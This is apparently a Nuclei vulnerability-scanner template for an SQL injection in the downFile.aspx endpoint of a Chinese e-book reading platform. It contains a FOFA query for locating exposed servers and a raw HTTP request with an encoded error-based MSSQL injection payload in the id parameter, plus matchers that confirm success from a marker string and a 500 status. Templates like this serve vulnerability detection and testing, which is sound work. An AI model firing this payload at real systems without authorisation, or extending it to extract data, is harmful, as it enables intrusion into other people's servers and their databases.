id: e-book-downfile-sqli

info:
  name: E-book downFile.aspx - SQL Injection
  author: qwtd
  severity: high
  description: |
    E-book downFile.aspx SQL Injection vulnerability exists in the e-book download file.
  reference:
    - https://github.com/wy876/POC/blob/main/%E7%94%B5%E5%AD%90%E5%9B%BE%E4%B9%A6%E9%98%85%E8%AF%BB%E5%B9%B3%E5%8F%B0/%E7%94%B5%E5%AD%90%E5%9B%BE%E4%B9%A6%E9%98%85%E8%AF%BB%E5%B9%B3%E5%8F%B0downFile.aspx%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
  metadata:
    fofa: body="/Index.aspx/SearchBy"
    verified: true
  tags: 电子图书阅读平台

http:
  - raw:
      - |
        GET /web/downFile.aspx?id=%27%2B%28SELECT+CHAR%2867%29%2BCHAR%2885%29%2BCHAR%2886%29%2BCHAR%2879%29+WHERE+1651%3D1651+AND+7828+IN+%28SELECT+%28CHAR%28113%29%2BCHAR%28122%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28113%29%2B%28SELECT+%28CASE+WHEN+%287828%3D7828%29+THEN+CHAR%2849%29+ELSE+CHAR%2848%29+END%29%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28120%29%2BCHAR%28122%29%2BCHAR%28113%29%29%29%29%2B%27 HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
        Accept: */*
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Connection: close

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "qzqzq1qkxzq"
      - type: status
        status:
          - 500
